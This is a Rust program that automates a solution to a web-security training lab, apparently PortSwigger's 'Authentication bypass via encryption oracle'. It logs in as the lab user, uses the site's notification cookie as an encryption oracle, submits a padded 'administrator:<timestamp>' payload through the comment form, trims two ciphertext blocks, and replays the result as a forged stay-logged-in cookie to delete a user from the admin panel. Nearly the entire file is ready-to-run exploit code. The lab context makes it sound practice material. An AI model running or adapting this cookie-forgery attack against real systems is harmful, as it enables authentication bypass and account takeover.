/**********************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 29/10/2023
*
* Lab: Authentication bypass via encryption oracle
*
* Steps: 1. Fetch the login page
*        2. Extract the csrf token and session cookie to login
*        3. Login as wiener
*        4. Extract the stay-logged-in cookie
*        5. Fetch a post page with the stay-logged in cookie value in the notification 
*           cookie to decrypt it
*        6. Extract the decrypted value
*        7. Extract the csrf token to post a comment
*        8. Post a comment with <PADDING>administrator:<NUMBER> in the email field 
*           ( where PADDING is 9 bytes and and NUMBER is extracted from the decrypted value 
*           in the previous step )
*        9. Extract the notification cookie
*        10. Decode the notification cookie with base64
*        11. Remove the first two blocks and encode the remaining blocks
*        12. Place the last encoded value in the stay-logged-in cookie and delete carlos
*
***********************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use base64::{engine::general_purpose::STANDARD, Engine};
use percent_encoding::percent_decode;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0acc00a5031db148813bf7fc007e00be.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting the csrf token and session cookie to login.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_from_cookie(login_page.headers(), "session")
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let mut csrf =
        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("stay-logged-in", "on"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Extracting the stay-logged-in cookie.. ".white(),);
    io::stdout().flush();

    // extract session cookie of wiener
    session = extract_from_multiple_cookies(&login.headers(), "session")
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract stay-logged-in cookie of wiener
    let stay_logged_in = extract_from_multiple_cookies(&login.headers(), "stay-logged-in").expect(
        &format!("{}", "[!] Failed to extract stay-logged-in cookie".red()),
    );

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗5⦘ Fetching a post page with the stay-logged in cookie value in the notification cookie to decrypt it.. "
            .white(),
    );
    io::stdout().flush();

    // fetch a post page
    let post_page = client
        .get(format!("{url}/post?postId=1"))
        .header(
            "Cookie",
            format!("notification={stay_logged_in}; session={session}"),
        )
        .send()
        .expect(&format!("{}", "[!] Failed to fetch a post page".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗6⦘ Extracting the decrypted value.. ".white(),);
    io::stdout().flush();

    // get the body of the response
    let body = post_page.text().unwrap();

    // extract the decrypted value
    let decrypted = capture_pattern(r"\s*(wiener:\w*)\s*</header>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the decrypted value".red()
    ));

    // get the numbers part
    let numbers_part = decrypted.split(":").nth(1).unwrap();

    // concat the administrator with the numbers part and add 9 bytes padding
    let admin_numbers_padding = format!("123456789administrator:{numbers_part}");

    println!("{} => {}", "OK".green(), decrypted.yellow());
    print!(
        "{}",
        "⦗7⦘ Extracting the csrf token to post a comment.. ".white(),
    );
    io::stdout().flush();

    // extract the csrf token to post a comment
    csrf = capture_pattern("csrf.+value=\"(.+)\"", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the csrf token to post a comment".red()
    ));

    println!("{}", "OK".green());
    print!(
        "{} {} {}",
        "⦗8⦘ Posting a comment with".white(),
        admin_numbers_padding.yellow(),
        "in the email field.. ".white()
    );
    io::stdout().flush();

    // post a comment
    let post_comment = client
        .post(format!("{url}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("postId", "1"),
            ("comment", "not important"),
            ("name", "hacker"),
            ("email", &admin_numbers_padding),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to post a comment".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗9⦘ Extracting the notification cookie.. ".white(),);
    io::stdout().flush();

    // extract the notification cookie
    let notification = extract_from_cookie(post_comment.headers(), "notification").expect(
        &format!("{}", "[!] Failed to extract the notification value".red()),
    );

    println!("{}", "OK".green());

    // URL decode the notification cookie
    let notification_url_decoded = percent_decode(notification.as_bytes())
        .decode_utf8()
        .unwrap()
        .to_string();

    // decode the URL decoded value with base64
    let decoded = STANDARD.decode(notification_url_decoded).unwrap();

    println!(
        "{} {}",
        "⦗10⦘ Decoding the notification cookie with base64..".white(),
        "OK".green()
    );

    // remove the first two block
    let first_two_blocks_removed = &decoded[32..];

    // encode the remain blocks with base64
    let encoded = STANDARD.encode(first_two_blocks_removed);

    println!(
        "{} {} => {}",
        "⦗11⦘ Removing the first two blocks and encode the remaining blocks..".white(),
        "OK".green(),
        encoded.yellow()
    );

    print!(
        "{}",
        "⦗12⦘ Placing the last encoded value in the stay-logged-in cookie and delete carlos.. "
            .white(),
    );
    io::stdout().flush();

    // delete carlos from the admin panel
    client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("stay-logged-in={encoded}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to delete carlos from the admin panel".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/*****************************************************
* Function to extract values from the cookie header
******************************************************/
fn extract_from_cookie(headers: &HeaderMap, text: &str) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern(&format!("{text}=(.*);"), cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/******************************************************
* Function to extract values from multiple cookies
*******************************************************/
fn extract_from_multiple_cookies(headers: &HeaderMap, cookie_name: &str) -> Option<String> {
    let mut cookie: Option<_> = None;

    match cookie_name {
        "session" => cookie = headers.get_all("set-cookie").iter().nth(1),
        "stay-logged-in" => cookie = headers.get_all("set-cookie").iter().nth(0),
        _ => (),
    }

    let text = cookie.unwrap().to_str().unwrap();

    match cookie_name {
        "session" => {
            if let Some(session) = capture_pattern("session=(.*);", text) {
                Some(session.as_str().to_string())
            } else {
                None
            }
        }
        "stay-logged-in" => {
            if let Some(token) = capture_pattern("stay-logged-in=(.*);", text) {
                Some(token.as_str().to_string())
            } else {
                None
            }
        }
        _ => None,
    }
}
